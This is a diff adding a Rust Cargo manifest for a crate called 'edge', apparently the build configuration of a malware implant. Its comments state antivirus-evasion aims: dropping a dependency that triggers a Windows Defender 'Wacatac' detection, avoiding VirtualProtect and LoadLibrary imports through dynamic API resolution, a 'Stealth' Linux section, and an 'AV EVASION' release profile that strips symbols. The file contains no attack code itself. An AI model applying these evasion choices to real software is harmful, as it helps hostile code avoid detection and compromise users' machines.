@@ -1,0 +1,83 @@
+[package]
+name = "edge"
+version = "0.1.0"
+edition = "2021"
+
+[features]
+default = []
+debug_mode = []
+
+[dependencies]
+# Lightweight async runtime (replaces tokio ~2MB savings)
+smol = "2.0"
+async-channel = "2.3"
+async-lock = "3.4"
+async-io = "2.3"
+futures-lite = "2.3"
+
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+log = "0.4"
+env_logger = "0.10"
+chacha20poly1305 = "0.10"
+chacha20 = "0.9"
+rand = "0.8"
+base64 = "0.21"
+# Lightweight blocking HTTP client (replaces reqwest ~1MB savings)
+ureq = { version = "2.9", default-features = false, features = ["json", "native-tls", "gzip"] }
+ed25519-dalek = { version = "2.0", features = ["rand_core"] }
+hex = "0.4"
+socket2 = "0.5"
+lru = "0.12"
+# pnet = "0.34" # REMOVED: Triggers Wacatac (IAT Pollution)
+sha2 = "0.10"
+flate2 = "1.0"
+
+# Internal Crate Dependencies
+protocol = { path = "../../shared/protocol" }
+plugin_api = { path = "../../shared/plugin_api" }
+# libloading = "0.8" # REMOVED: Replaced by NativeLibrary
+
+# Linux API for Stealth
+[target.'cfg(target_os = "linux")'.dependencies]
+nix = { version = "0.27", features = ["fs", "mount", "mman"] }
+libc = "0.2"
+goblin = "0.7"
+
+# Windows API for Named Pipes
+[target.'cfg(not(windows))'.dependencies]
+libloading = "0.8"
+
+[target.'cfg(windows)'.dependencies]
+# winreg = "0.50" # REMOVED: Using Dynamic API
+# windows = { version = "0.48", features = [ ... ] } # REMOVED: Using Dynamic API
+windows-sys = { version = "0.48", features = [
+    "Win32_System_Pipes",
+    "Win32_Foundation",
+    "Win32_Storage_FileSystem",
+    "Win32_System_IO",
+    "Win32_System_Threading",
+    # "Win32_Security", # Removed to avoid advapi32.dll imports if possible
+    # "Win32_System_Memory", # Removed to avoid VirtualProtect import
+    # "Win32_System_LibraryLoader", # Removed to avoid LoadLibrary import
+    # "Win32_System_Diagnostics_Debug",
+    # "Win32_System_ProcessStatus"
+] }
+
+[lib]
+name = "edge"
+path = "src/lib.rs"
+crate-type = ["cdylib", "rlib"]
+
+[[bin]]
+name = "edge"
+path = "src/main.rs"
+
+# AV EVASION: Maximum stripping and optimization
+[profile.release]
+panic = "abort"           # Remove panic unwinding strings
+lto = true                # Link-Time Optimization (removes dead code)
+codegen-units = 1         # Better optimization
+opt-level = "z"           # Optimize for size
+strip = "symbols"         # Strip all symbols
+debug = false             # No debug info
